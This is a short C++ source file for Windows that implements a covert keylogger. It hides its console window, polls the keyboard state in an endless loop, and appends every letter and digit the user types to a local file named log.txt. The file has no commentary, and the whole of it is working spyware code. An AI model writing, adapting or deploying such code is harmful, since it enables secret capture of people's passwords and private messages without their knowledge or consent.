#include <windows.h>
#include <fstream>

int main()
{
	ShowWindow(GetConsoleWindow(), SW_HIDE);
	std::ofstream log;
	while (true)
	{
		for (int i = 8; i <= 190; i++)
		{
			if (GetAsyncKeyState(i) == -32767)
			{
				if ((i >= 65 && i <= 90) || (i >= 48 && i <= 57))
				{
					log.open("log.txt", std::ofstream::app);
					log << char(i) << "\n";
					log.close();
				}
			}
		}
	}
	return 0;
}
